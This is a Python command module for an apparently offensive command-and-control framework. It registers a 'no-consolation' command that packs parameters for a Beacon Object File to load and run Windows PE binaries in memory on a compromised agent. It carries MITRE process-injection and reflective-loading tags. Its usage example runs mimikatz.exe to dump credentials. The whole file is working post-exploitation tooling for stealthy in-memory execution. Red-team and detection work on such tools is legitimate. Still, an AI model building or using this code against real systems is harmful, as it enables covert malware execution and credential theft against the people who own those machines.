import conquest
import os.path 

def _noconsolation(agentId, cmdline, args): 
    path = conquest.get_string(args, 0)             # Path needs to be a string arg instead of file because a cached filename can also be supplied as the argument
    arguments = conquest.get_string(args, 1)
    local = conquest.get_bool(args, 2)
    inthread = conquest.get_bool(args, 3)
    link_to_peb = conquest.get_bool(args, 4)
    dont_unload = conquest.get_bool(args, 5)
    timeout = conquest.get_int(args, 6)
    overwrite_headers = conquest.get_bool(args, 7)
    method = conquest.get_string(args, 8)
    unicode_args = conquest.get_bool(args, 9)
    no_output = conquest.get_bool(args, 10)
    alloc_console = conquest.get_bool(args, 11)
    close_handles = conquest.get_bool(args, 12)
    free_libraries = conquest.get_string(args, 13)
    dont_save = conquest.get_bool(args, 14)
    list_pes = conquest.get_bool(args, 15)
    unload_pe = conquest.get_string(args, 16)
    load_all_deps = conquest.get_bool(args, 17)
    load_all_deps_but = conquest.get_string(args, 18)
    load_deps = conquest.get_string(args, 19)
    search_paths = conquest.get_string(args, 20)

    path_set = False
    name_set = False
    pename = ""
    pepath = ""
    pebytes = b""
    pecmdline = ""
    
    # Validation
    if not free_libraries and not unload_pe and not list_pes and not close_handles and not path:
        conquest.error(agentId, "Missing required positional argument: path", cmdline)
        return
    
    if path and (os.path.exists(path) or path.startswith(('C:\\', 'D:\\', 'E:\\', 'F:\\'))):
        path_set = True
    elif not local and path and not os.path.exists(path) and path.startswith('/'):
        conquest.error(agentId, f"Specified executable {path} does not exist", cmdline)
        return
    elif not local and path and path.endswith('.exe'):
        name_set = True
        pename = path
    
    if list_pes and (path_set or unload_pe or free_libraries):
        conquest.error(agentId, "The option --list-pes must be run alone", cmdline)
        return
    
    if free_libraries and unload_pe:
        conquest.error(agentId, "The option --unload-pe must be run alone", cmdline)
        return
    
    if path_set and (unload_pe or free_libraries):
        conquest.error(agentId, "The option --unload-pe or --free-libraries must be run alone", cmdline)
        return
    
    if timeout != 60 and inthread:
        conquest.error(agentId, "The options --inthread and --timeout are not compatible", cmdline)
        return
    
    # Parse the PE if provided as an argument
    if path_set:
        pename = os.path.basename(path)
        
        if not local:
            # PE is sent over the network by the operator
            pepath = "C:\\Windows\\System32\\" + pename
            
            if not os.path.exists(path):
                conquest.error(agentId, f"Specified executable does not exist: {path}", cmdline)
                return
            
            try:
                with open(path, 'rb') as f:
                    pebytes = f.read()
            except Exception as e:
                conquest.error(agentId, f"Could not read PE: {str(e)}", cmdline)
                return
            
            if len(pebytes) == 0:
                conquest.error(agentId, "Could not read PE.", cmdline)
                return
            
            path = "" 
        
        else:
            # PE is loaded from the target
            pepath = path
    
    # Build command line
    if path_set or name_set:
        pecmdline = pename
        if arguments:
            pecmdline += " " + arguments
    
    # Get current timestamp
    import datetime
    timestamp = datetime.datetime.now().strftime('%d/%m %H:%M')
    
    bof = conquest.modules_root() + "/execution/No-Consolation/dist/NoConsolation.x64.o"    
    params = conquest.bof_pack("ZzZbziiiZzziiiiziizzziiizzzi", [
        pename,                         # Z: PE name (wide)
        pename,                         # z: PE name
        pepath,                         # Z: PE path (wide)
        pebytes,                        # b: PE bytes
        path,                           # z: PE path argument (empty if remote, full path if local)
        int(local),                     # i: load from target machine
        timeout,                        # i: timeout in seconds
        int(overwrite_headers),         # i: overwrite PE headers
        pecmdline,                      # Z: command line (wide)
        pecmdline,                      # z: command line
        method,                         # z: export method name 
        int(unicode_args),              # i: use unicode arguments
        int(no_output),                 # i: suppress output
        int(alloc_console),             # i: allocate console
        int(close_handles),             # i: close handles
        free_libraries,                 # z: libraries to unload
        int(dont_save),                 # i: don't save in memory
        int(list_pes),                  # i: list loaded PEs
        unload_pe,                      # z: PE to unload
        conquest.user(),                # z: username
        timestamp,                      # z: timestamp
        int(link_to_peb),               # i: link to PEB
        int(dont_unload),               # i: don't unload
        int(load_all_deps),             # i: load all dependencies
        load_all_deps_but,              # z: dependencies to exclude
        load_deps,                      # z: dependencies to load
        search_paths,                   # z: custom search paths
        int(inthread)                   # i: run in thread
    ])
    
    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)

cmd_noconsolation = (
    conquest.createCommand(name="no-consolation", description="Execute an unmanaged PE in memory.", example="no-consolation --local C:\\Windows\\System32\\calc.exe\n         no-consolation /mnt/c/tools/precompiled-binaries/Credentials/mimikatz.exe coffee exit",
                           message="Tasked agent to execute an unmanaged PE in memory.", mitre=["T1055", "T1620"])
            .addArgString("path", "Full path to the windows EXE/DLL to be run in memory. If already loaded, you can simply specify the binary name.")   
            .addArgString("arguments", "Arguments to pass to the binary.", False, "", -1)
            .addFlagBool("--local", "local", "Load the binary from the target Windows machine.")
            .addFlagBool("--inthread", "inthread", "Run the PE with the main thread (may hang the agent).")
            .addFlagBool("--link-to-peb", "link-to-peb", "Load the PE into the PEB.")
            .addFlagBool("--dont-unload", "dont-unload", "Don't unload the DLL after execution.")
            .addFlagInt("--timeout", "timeout", "Timeout in seconds to wait for PE completion (default: 60, 0 to disable). Not compatible with --inthread.", 0, 60)
            .addFlagBool("-k", "overwrite-headers", "Overwrite the PE headers.")
            .addFlagString("--method", "method", "Export method/function name to execute for DLLs (default: DllMain).", False, "DllMain")
            .addFlagBool("-w", "unicode-args", "Pass command line arguments in UNICODE format (default: ANSI).")
            .addFlagBool("--no-output", "no-output", "Do not capture output.")
            .addFlagBool("--alloc-console", "alloc-console", "Allocate a console (spawns new process).")
            .addFlagBool("--close-handles", "close-handles", "Close pipe handles after execution.")
            .addFlagString("--free-libs", "FL_DLLS", "Comma-separated list of DLLs to offload from memory.")
            .addFlagBool("--dont-save", "dont-save", "Do not save this binary in memory.")
            .addFlagBool("--list-pes", "list-pes", "List all PEs loaded in memory.")
            .addFlagString("--unload-pe", "PE_NAME", "Unload a specific PE from memory by name.")
            .addFlagBool("--load-all-deps", "deps", "Custom load all PE dependencies.")
            .addFlagString("--load-all-deps-but", "LADB_DLLS", "Custom load all dependencies except those specified (comma-separated).")
            .addFlagString("--load-deps", "LD_DLLS", "Custom load specified dependencies (comma-separated).")
            .addFlagString("--search-paths", "PATHS", "Custom search paths for DLLs (comma-separated).")
            .setHandler(_noconsolation)
).registerToGroup("execution")